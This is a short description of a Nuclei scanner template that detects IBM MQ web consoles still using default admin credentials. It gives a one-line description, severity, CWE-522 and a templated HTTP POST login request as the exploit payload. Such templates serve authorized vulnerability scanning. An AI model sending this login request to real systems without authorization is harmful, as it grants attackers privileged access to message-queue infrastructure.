# Nuclei Template: IBM MQSeries Web Console Default Login
**Template ID:** ibm-mqseries-default-login
**Vulnerability Class:** Insufficiently Protected Credentials
**Severity:** High
**CWE:** CWE-522
**Source:** Nuclei Template (`ibm-mqseries-default-login.yaml`)

## Vulnerability Information & PoC

## Description
IBM MQ and REST API default admin credentials were discovered. An unauthenticated, remote attacker can exploit this gain privileged or administrator access to the system.

## Steps to reproduce / Exploit Payload
```http
POST /ibmmq/console/j_security_check HTTP/1.1
Host: {{Hostname}}
Origin: {{RootURL}}
Content-Type: application/x-www-form-urlencoded
Referer: {{RootURL}}/ibmmq/console/login.html

j_username={{username}}&j_password={{password}}
```

## References
- https://github.com/ibm-messaging/mq-container/blob/master/etc/mqm/mq.htpasswd
- https://vulners.com/nessus/IBM_MQ_DEFAULT_CREDENTIALS.NASL
